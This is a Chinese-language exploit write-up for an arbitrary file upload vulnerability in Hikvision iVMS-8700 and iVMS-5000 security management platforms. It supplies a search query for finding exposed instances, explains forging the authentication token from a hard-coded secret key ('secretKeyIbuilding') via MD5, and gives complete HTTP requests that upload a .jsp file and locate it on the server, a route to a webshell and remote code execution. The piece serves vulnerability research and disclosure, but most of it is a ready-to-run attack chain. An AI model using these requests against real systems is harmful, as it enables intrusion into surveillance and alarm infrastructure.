# 海康威视iVMS-8700综合安防系统resourceOperations任意文件上传漏洞

# 一、漏洞简介
  海康威视iVMS集中监控应用管理平台，是以安全防范业务应用为导向，以视频图像应用为基础手段，综合视频监控、联网报警、智能分析、运维管理等多种安全防范应用系统，构建的多业务应用综合管理平台。攻击者通过获取密钥任意构造token，请求/resourceOperations/upload接口任意上传文件，导致获取服务器webshell权限，同时可远程进行恶意代码执行。

# 二、影响版本
+ 海康威视综合安防系统iVMS-5000
+ 海康威视综合安防系统 iVMS-8700

# 三、资产测绘
+ hunter：`web.body="/views/home/file/installPackage.rar"`

![1691851218187-fa3d0a98-32b2-48ea-a294-7c7f565c20f0.png](./img/kDLBwyHdk2d3W6A_/1691851218187-fa3d0a98-32b2-48ea-a294-7c7f565c20f0-110733.png)

+ 登录页面：

![1691851119101-58fb28dd-18f8-4fca-b027-9931d8ce0111.png](./img/kDLBwyHdk2d3W6A_/1691851119101-58fb28dd-18f8-4fca-b027-9931d8ce0111-046363.png)

# 四、漏洞复现
1. 访问`<font style="color:rgb(30, 107, 184);">/eps/api/resourceOperations/upload</font>`，发现token需要进行鉴权

```plain
POST /eps/api/resourceOperations/upload HTTP/1.1
Host: xx.xx.xx.xx
Accept-Language:zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryGEJwjlojPo
Cache-Control:max-age=0
Connection:close
Content-Length: 52

service=http://xx.xx.xx.xx/home/index.action
```

![1691851435344-ed7479f5-f1be-43e6-aa67-2b85e942d1fa.png](./img/kDLBwyHdk2d3W6A_/1691851435344-ed7479f5-f1be-43e6-aa67-2b85e942d1fa-589948.png)

2. 构造token绕过认证（内部机制：如果token值与请求url+secretkey的md5值相同就可以绕过认证）

secretkey是代码里写死的（默认值：secretKeyIbuilding）

token值需要进行MD5加密（32位大写）

组合：token=MD5(url+"secretKeyIbuilding")

```plain
http://xx.xx.xx.xx/eps/api/resourceOperations/uploadsecretKeyIbuilding
```

![1691851562964-59ab6b79-59b0-4427-aa22-0724519c2287.png](./img/kDLBwyHdk2d3W6A_/1691851562964-59ab6b79-59b0-4427-aa22-0724519c2287-296469.png)

3. 构造上传文件,上传成功且返回了resourceUuid值

```plain
POST /eps/api/resourceOperations/upload?token=DFB0D4034A82263A4DA9A37EB0DA687B HTTP/1.1
Host: xx.xx.xx.xx
Accept-Language:zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryGEJwjlojPo
Cache-Control:max-age=0
Connection:close
Content-Length: 178

------WebKitFormBoundaryGEJwjlojPo
Content-Disposition: form-data;name="fileUploader"; filename="test.jsp"
Content-Type: image/jpeg

1
------WebKitFormBoundaryGEJwjlojPo--
```

![1691851646699-a986ea3a-d25a-45cb-bf5a-d639f1702215.png](./img/kDLBwyHdk2d3W6A_/1691851646699-a986ea3a-d25a-45cb-bf5a-d639f1702215-549185.png)

4. 上传文件位置

```plain
http://xx.xx.xx.xx/eps/upload/resourceUuid的值.jsp
```

![1691851724492-57942c68-7154-45c5-b964-1cfb0b1fcb13.png](./img/kDLBwyHdk2d3W6A_/1691851724492-57942c68-7154-45c5-b964-1cfb0b1fcb13-384332.png)



> 更新: 2024-02-29 23:57:17  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dxm9gap6g8zry92h>